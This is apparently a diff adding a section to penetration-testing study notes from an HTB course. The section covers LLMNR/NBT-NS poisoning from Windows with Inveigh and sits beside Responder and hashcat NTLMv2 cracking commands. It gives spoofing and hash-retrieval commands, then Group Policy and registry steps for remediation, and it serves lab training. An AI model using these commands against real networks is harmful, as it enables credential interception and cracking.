@@ -8,6 +8,9 @@
 - [Sniffing out a Foothold](#sniffing-out-a-foothold)
     - [LLMNR/NBT-NS Poisoning - from Linux](#llmnrnbt-ns-poisoning---from-linux)
         - [Responder](#responder)
+    - [LLMNR/NBT-NS Poisoning - from Windows](#llmnrnbt-ns-poisoning---from-windows)
+        - [Remediation](#Remediation)
+
 
 
 
@@ -136,3 +139,59 @@ sudo responder -I ens224
 hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
 
 ```
+
+### LLMNR/NBT-NS Poisoning - from Windows
+- Inveigh works similar to Responder, but is written in PowerShell and C#.
+- There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that lists all parameters and usage instructions.
+- [Parameter Help](https://github.com/Kevin-Robertson/Inveigh#parameter-help)
+```powershell
+# Using Inveigh
+PS C:\htb> Import-Module .\Inveigh.ps1
+PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
+
+# LLMNR and NBNS spoofing, and output to the console and write to a file.
+PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+```
+- **C# Inveigh (InveighZero)**
+    - The PowerShell version of Inveigh is the original version and is no longer updated. 
+    - The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. 
+    - Before we can use the C# version of the tool, we have to compile the executable.
+
+
+- We can hit the `esc` key to enter interactive mode. After typing HELP and hitting enter, we are presented with several options such as:
+```powershell
+GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
+GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
+```
+
+- We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.
+
+#### Remediation
+- LLMNR
+    - We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."
+
+- NBT-NS
+    - NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening Network and Sharing Center under Control Panel, clicking on Change adapter settings, right-clicking on the adapter to view its properties, selecting Internet Protocol Version 4 (TCP/IPv4), and clicking the Properties button, then clicking on Advanced and selecting the WINS tab and finally selecting Disable NetBIOS over TCP/IP.
+    ![disable-nbts](/images/disable_nbtns.jpg)
+
+
+    - While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:
+    ```powershell
+
+    $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
+    Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
+
+    ```
+
+    - In the Local Group Policy Editor, we will need to double click on Startup, choose the PowerShell Scripts tab, and select "For this GPO, run scripts in the following order" to Run Windows PowerShell scripts first, and then click on Add and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.
+    ![nbts-gpo](/images/nbtns_gpo.jpg)
+
+    - To push this out to all hosts in a domain, we could create a GPO using Group Policy Management on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:
+    ```
+    \\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+    ```
+    - Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.
+    ![nbts-gpo-dc](/images/nbtns_gpo_dc.jpg)
+
+    
